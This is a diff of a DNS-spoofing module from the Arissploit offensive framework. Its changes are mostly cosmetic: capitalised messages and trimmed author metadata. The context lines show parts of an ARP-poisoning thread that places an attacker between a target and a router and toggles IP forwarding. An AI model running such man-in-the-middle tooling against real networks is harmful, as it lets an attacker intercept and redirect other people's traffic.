@@ -1,5 +1,3 @@
-
-
 from core.arissploit import *
 from core import colors
 import os
@@ -15,16 +13,14 @@ try:
 except:
 	importerror = True
 	terror = traceback.format_exc()
-	printError("cannot import netfilterqueue! have you installed dependencies?")
+	printError("Cannot import netfilterqueue! Have you installed dependencies?")
 
 
 conf = {
 	"name": "dns_spoof",
 	"version": "2.0",
-	"shortdesc": "dns spoof",
-	"author": "entynetproject",
-	"github": "entynetproject",
-	"email": "entynetproject0@gmail.com",
+	"shortdesc": "DNS spoof.",
+	"author": "Entynetproject",
 	"initdate": "29.4.2016",
 	"lastmod": "31.12.2016",
 	"apisupport": False,
@@ -35,16 +31,16 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('target', ['192.168.1.2', 'target address']),
-	('router', ['192.168.1.1', 'router address']),
-	("arp_spoof", ["true", "arp spoof [true/false]"])
+	('target', ['192.168.1.2', 'Target address.']),
+	('router', ['192.168.1.1', 'Router address.']),
+	("arp_spoof", ["true", "Arp spoof [true/false]."])
 ))
 
 # Additional notes to options
-option_notes = colors.red+'remember to edit hostlist:\n'+getpath.conf()+"hosts"+colors.end
+option_notes = colors.red+'Remember to edit hostlist:\n'+getpath.conf()+"hosts"+colors.end
 
 customcommands = {
-	'stop': 'end dns spoof'
+	'stop': 'End DNS spoof.'
 }
 
 #simple changelog
@@ -91,29 +87,29 @@ class ArpSpoofer(threading.Thread):
 		routerMAC = self.originalMAC(self.router)
 		victimMAC = self.originalMAC(self.victim)
 		if routerMAC == None:
-			printError("could not find router MAC address")
+			printError("Could not find router MAC address!")
 			if tried < 5:
-				printInfo("trying again...")
+				printInfo("Trying again...")
 				tried =+ 1
 				self.run()
-			printInfo("giving up...")
-			self.controller.error = "[err] could not find router MAC address"
+			printInfo("Giving up...")
+			self.controller.error = "[err] Could not find router MAC address!"
 			self.controller.kill = True
 		if victimMAC == None:
-			printError("could not find victim MAC address")
+			printError("Could not find victim MAC address!")
 			if tried < 5:
-				printInfo("trying again...")
+				printInfo("Trying again...")
 				tried =+ 1
 				self.run()
 			printInfo("giving up...")
-			self.controller.error = "[err] could not find victim MAC address"
+			self.controller.error = "[err] Could not find victim MAC address!"
 			self.controller.kill = True
 
 		while 1:
 			if self.controller.kill == True:
 				self.restore(self.router, self.victim, routerMAC, victimMAC)
 				os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
-				printInfo("arp spoofing ended")
+				printInfo("Arp spoofing ended.")
 				return
 			self.poison(self.router, self.victim, routerMAC, victimMAC)
 			time.sleep(1.5)
@@ -147,9 +143,9 @@ hostlist = []
 
 def run():
 	if importerror == True:
-		printError("netfilterqueue isn't imported")
-		printInfo("install the dependencies and reload this module")
-		print("traceback:\n"+str(error))
+		printError("Netfilterqueue isn't imported!")
+		printInfo("Install the dependencies and reload this module!")
+		print("Traceback:\n"+str(error))
 		return
 
 	controller.reset()
